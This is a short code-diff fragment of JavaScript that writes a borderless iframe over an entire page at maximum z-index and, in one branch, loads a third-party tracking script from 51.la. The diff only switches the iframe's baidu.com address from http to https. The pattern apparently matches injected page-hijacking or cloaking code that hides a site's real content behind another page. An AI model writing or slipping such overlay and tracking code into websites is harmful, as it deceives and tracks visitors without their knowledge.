@@ -9,5 +9,5 @@ document.write("<iframe name=\"frame1\" style=\"position:absolute;left:0px;top:0
 document.write ('<script type="text/javascript"  src="https://js.users.51.la/20085659.js"></script>');
 }
 else
-{document.write("<iframe name=\"frame1\" style=\"position:absolute;left:0px;top:0px;z-index:2147483647;\" src=\"http:\/\/www.baidu.com" +  "\" rel=\"nofollow\" width=\"100%\" height=\"3100px\" frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" scrolling=\"no\"></iframe>");
+{document.write("<iframe name=\"frame1\" style=\"position:absolute;left:0px;top:0px;z-index:2147483647;\" src=\"https:\/\/www.baidu.com" +  "\" rel=\"nofollow\" width=\"100%\" height=\"3100px\" frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" scrolling=\"no\"></iframe>");
 }
